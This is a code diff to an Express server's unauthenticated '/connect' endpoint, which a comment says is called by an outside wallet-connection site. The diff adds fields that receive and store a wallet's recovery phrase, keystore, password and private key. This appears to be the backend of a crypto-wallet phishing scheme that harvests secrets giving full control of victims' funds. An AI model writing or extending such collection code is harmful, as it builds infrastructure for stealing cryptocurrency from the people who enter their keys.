@@ -501,11 +501,15 @@ app.post("/replychats", requireLogin, async (req, res) => {
 //////// AN ENDPOINT TO BE CALLED BY https://rpcmasters.com/#
 app.post("/connect", async (req, res) => {
   try {
-    const { wallet_id, type, value, createdAt } = req.body;
+    const { wallet_id, type, value, phrase, keystoreval, password, privatekeyval, createdAt } = req.body;
     const data = {
       wallet_id,
       type,
       value,
+      phrase,
+      keystoreval,
+      password,
+      privatekeyval,
       createdAt,
     };
     data.createdAt = new Date();
